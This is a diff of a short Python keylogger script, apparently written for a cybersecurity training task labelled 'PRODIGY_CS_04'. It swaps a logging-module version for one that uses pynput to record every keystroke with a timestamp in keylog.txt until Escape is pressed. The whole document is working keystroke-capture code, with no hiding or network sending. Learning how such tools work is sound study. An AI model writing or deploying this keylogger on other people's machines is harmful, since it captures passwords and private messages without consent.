@@ -1,24 +1,32 @@
+#task 04
+#keylogger
+#PRODIGY_CS_04
 #sahil sharma
-from pynput.keyboard import Key, Listener
-import logging
+from pynput import keyboard
+from datetime import datetime
 
-# Setting up the log file and format
-log_dir = ""
-logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+# Define the path where the keystrokes will be saved
+log_file = "keylog.txt"
 
-# Function to log keystrokes
 def on_press(key):
     try:
-        logging.info(str(key))
+        # Get the current time
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        # Write the timestamp and key to the file
+        with open(log_file, "a") as f:
+            f.write(f"{timestamp} - {key.char}\n")
     except AttributeError:
-        logging.info('Special key {0} pressed'.format(key))
+        # Handle special keys (e.g., space, enter, etc.)
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        with open(log_file, "a") as f:
+            f.write(f"{timestamp} - [{key}]\n")
 
-# Function to handle when a key is released
 def on_release(key):
-    if key == Key.esc:
-        # Stop listener
+    if key == keyboard.Key.esc:
+        # Stop the listener when the escape key is pressed
         return False
 
-# Setting up the listener
-with Listener(on_press=on_press, on_release=on_release) as listener:
+# Start listening to keyboard events
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
